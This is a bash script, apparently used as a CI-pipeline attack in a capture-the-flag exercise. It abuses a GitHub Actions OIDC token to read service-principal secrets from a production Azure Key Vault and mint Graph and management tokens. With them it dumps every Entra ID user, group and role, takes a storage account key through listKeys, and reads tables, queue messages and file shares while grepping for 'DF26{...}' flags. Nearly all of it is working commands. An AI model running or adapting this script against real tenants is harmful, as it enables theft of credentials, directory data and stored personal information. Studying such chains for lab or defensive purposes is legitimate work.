#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-platform-prod-sea
ACC=sttblcilogsprodx3euoz
TEN=$AZURE_TENANT_ID
MGMT="https://management.azure.com"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
G="https://graph.microsoft.com/v1.0"; GB="https://graph.microsoft.com/beta"

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')

# ---------- (1) Entra user deep read ----------
J=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/directory-audit-principal?api-version=7.4" | jq -r '.value')
da=$(printf '%s' "$J"|jq -r '.appId//.clientId'); ds=$(printf '%s' "$J"|jq -r '.clientSecret//.password//.secret')
T=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$da" -d "client_secret=$ds" -d "scope=https://graph.microsoft.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
H=(-H "Authorization: Bearer $T")
echo "===== USERS: default full objects ====="
U=$(curl -sS $M "${H[@]}" "$G/users?\$top=999")
echo "$U" | jq -c '.value[]?'
echo "$U" | grep -aoE "DF26\{[^}]*\}" && echo "*** FLAG ***"
echo "===== USERS: extension attributes + identities ====="
UE=$(curl -sS $M "${H[@]}" "$GB/users?\$top=999&\$select=id,displayName,userPrincipalName,onPremisesExtensionAttributes,identities,employeeId,otherMails,jobTitle,department,companyName")
echo "$UE" | jq -c '.value[]?'
echo "$UE" | grep -aoE "DF26\{[^}]*\}" && echo "*** FLAG ***"
for uid in $(echo "$U" | jq -r '.value[]?.id'); do
  echo "--- user $uid open extensions / memberOf ---"
  curl -sS $M "${H[@]}" "$G/users/$uid/extensions" | jq -c '.value[]?' 2>/dev/null
  curl -sS $M "${H[@]}" "$G/users/$uid?\$select=displayName,aboutMe,mySite,responsibilities,skills,interests,pastProjects,schools" | jq -c '.' 2>/dev/null
  curl -sS $M "${H[@]}" "$G/users/$uid/memberOf" | jq -rc '.value[]?|{t:."@odata.type",dn:.displayName,desc:.description}' 2>/dev/null
done 2>/dev/null
# groups w/ description + directory settings
echo "===== groups + org branding + directoryRoleTemplates ====="
curl -sS $M "${H[@]}" "$GB/groups?\$top=999&\$select=id,displayName,description,mailNickname" | jq -c '.value[]?'
curl -sS $M "${H[@]}" "$GB/directoryRoleTemplates?\$top=999" | jq -c '.value[]?|{displayName,description}' | grep -aiE "df26|flag" || true

# ---------- (2) storage tables + queues + shares ----------
Js=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
sa=$(printf '%s' "$Js"|jq -r '.appId//.clientId'); ss=$(printf '%s' "$Js"|jq -r '.clientSecret//.password//.secret')
SS=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$sa" -d "client_secret=$ss" -d "scope=https://management.azure.com/.default" -d "grant_type=client_credentials" | jq -r '.access_token // empty')
KEY=$(curl -sS $M -X POST -H "Authorization: Bearer $SS" -H "Content-Length: 0" "$MGMT/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$ACC/listKeys?api-version=2023-01-01" | jq -r '.keys[0].value // empty')
echo "===== storage account key len=${#KEY} ====="
C=(--account-name "$ACC" --account-key "$KEY" --only-show-errors -o tsv)
echo "--- TABLES: entities ---"
for t in $(az storage table list "${C[@]}" --query '[].name' 2>/dev/null); do
  echo "  [table $t]"; az storage entity query "${C[@]}" -t "$t" 2>/dev/null | grep -aoE "DF26\{[^}]*\}" && echo "   *** FLAG ($t) ***"
  az storage entity query "${C[@]}" -t "$t" --num-results 5 -o json 2>/dev/null | head -c 600; echo
done
echo "--- QUEUES: peek messages ---"
for q in $(az storage queue list "${C[@]}" --query '[].name' 2>/dev/null); do
  echo "  [queue $q]"; az storage message peek "${C[@]}" -q "$q" --num-messages 32 -o json 2>/dev/null | python3 -c 'import sys,base64,json
try:
 d=json.load(sys.stdin)
except: sys.exit()
for m in d:
 c=m.get("content","")
 print("   ",c[:200])
 try: print("    b64:",base64.b64decode(c).decode("utf-8","ignore")[:200])
 except: pass' 2>/dev/null | grep -aiE "df26|flag" || true
done
echo "--- FILE SHARES ---"
for s in $(az storage share list "${C[@]}" --query '[].name' 2>/dev/null); do
  echo "  [share $s]"; az storage file list "${C[@]}" -s "$s" --query '[].name' 2>/dev/null
done
echo "FINAL2 DONE"; exit 0
